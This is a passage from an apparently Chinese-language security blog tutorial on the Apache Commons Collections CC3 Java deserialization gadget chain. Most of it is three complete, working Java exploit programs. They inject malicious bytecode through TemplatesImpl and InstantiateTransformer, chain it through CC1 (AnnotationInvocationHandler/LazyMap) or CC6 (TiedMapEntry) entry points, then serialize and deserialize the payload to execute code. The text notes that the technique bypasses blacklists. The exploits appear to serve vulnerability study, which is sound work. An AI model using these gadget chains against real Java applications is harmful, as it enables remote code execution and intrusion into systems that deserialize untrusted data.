+<a class=anchor href=#%e6%9e%84%e9%80%a0-exp>#</a></h3><p>后半段的命令执行是不变的，也就是<code>TemplatesImpl</code>部分的 EXP 是不变的。</p><p>先看一下后半段的 EXP：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.CC3serial;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC3serialize</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        instantiateTransformer.<span style=color:#a6e22e>transform</span>(TrAXFilter.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>后半部分的 EXP 写好了，接下来去找入口类的前半部分，而前半部分是从谁调用了<code>transform</code>方法开始，所以 CC1 和 CC6 前半部分 EXP 都是有效的。</p><h4 id=cc1-作为前半段>CC1 作为前半段
+<a class=anchor href=#cc1-%e4%bd%9c%e4%b8%ba%e5%89%8d%e5%8d%8a%e6%ae%b5>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.CC3serial;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.annotation.Retention;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.InvocationHandler;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Proxy;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC3serialize</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//instantiateTransformer.transform(TrAXFilter.class);</span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(TrAXFilter.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                instantiateTransformer
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> aih <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style=display:flex><span>        Constructor<span style=color:#f92672>&lt;?&gt;</span> aihConstructor <span style=color:#f92672>=</span> aih.<span style=color:#a6e22e>getDeclaredConstructor</span>(Class.<span style=color:#a6e22e>class</span>, Map.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>        aihConstructor.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        InvocationHandler invocationhandler <span style=color:#f92672>=</span> (InvocationHandler) aihConstructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, lazyMap);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Map proxyMap <span style=color:#f92672>=</span> (Map) Proxy.<span style=color:#a6e22e>newProxyInstance</span>(ClassLoader.<span style=color:#a6e22e>getSystemClassLoader</span>(), <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Map.<span style=color:#a6e22e>class</span>}, invocationhandler);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Object o <span style=color:#f92672>=</span> aihConstructor.<span style=color:#a6e22e>newInstance</span>(Retention.<span style=color:#a6e22e>class</span>, proxyMap);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(o);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=cc6-作为前半部分>CC6 作为前半部分
+<a class=anchor href=#cc6-%e4%bd%9c%e4%b8%ba%e5%89%8d%e5%8d%8a%e9%83%a8%e5%88%86>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.CC6serial;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InstantiateTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.xml.transform.Templates;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6serialize</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
+</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> TemplatesImpl<span style=color:#f92672>&gt;</span> templatesClass <span style=color:#f92672>=</span> templates.<span style=color:#a6e22e>getClass</span>();
+</span></span><span style=display:flex><span>        Field name <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_name&#34;</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        name.<span style=color:#a6e22e>set</span>(templates,<span style=color:#e6db74>&#34;abc&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field bytecodes <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_bytecodes&#34;</span>);
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evil <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class&#34;</span>));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> codes<span style=color:#f92672>=</span>{evil};
+</span></span><span style=display:flex><span>        bytecodes.<span style=color:#a6e22e>set</span>(templates,codes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Field tfactory <span style=color:#f92672>=</span> templatesClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;_tfactory&#34;</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        tfactory.<span style=color:#a6e22e>set</span>(templates,<span style=color:#66d9ef>new</span> TransformerFactoryImpl());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InstantiateTransformer instantiateTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer(<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Templates.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{templates});
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//instantiateTransformer.transform(TrAXFilter.class);</span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(TrAXFilter.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                instantiateTransformer
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, <span style=color:#66d9ef>new</span> ConstantTransformer(1));
+</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazyMap, <span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> serialMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        serialMap.<span style=color:#a6e22e>put</span>(tiedMapEntry,<span style=color:#e6db74>&#34;value&#34;</span>);
+</span></span><span style=display:flex><span>        lazyMap.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;</span>LazyMap<span style=color:#f92672>&gt;</span> lazyMapClass <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>class</span>;
+</span></span><span style=display:flex><span>        Field factory <span style=color:#f92672>=</span> lazyMapClass.<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;factory&#34;</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>        factory.<span style=color:#a6e22e>set</span>(lazyMap,chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(serialMap);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>CC3 主要是另外一种命令执行的方式，能绕过黑名单。利用链主要就是和 CC1、CC6 区别不大，根据 CC1 和 CC6 的思路进行一下微调即可。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#cc3-简介>CC3 简介</a></li><li><a href=#templatesimpl-解析>TemplatesImpl 解析</a></li><li><a href=#templatesimpl-利用>TemplatesImpl 利用</a></li><li><a href=#cc1-链的-templatesimpl-实现方法>CC1 链的 TemplatesImpl 实现方法</a></li><li><a href=#cc6-链的-templatesimpl-的实现方式>CC6 链的 TemplatesImpl 的实现方式</a></li><li><a href=#cc3-链>CC3 链</a><ul><li><a href=#cc3-链分析>CC3 链分析</a></li><li><a href=#构造-exp>构造 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
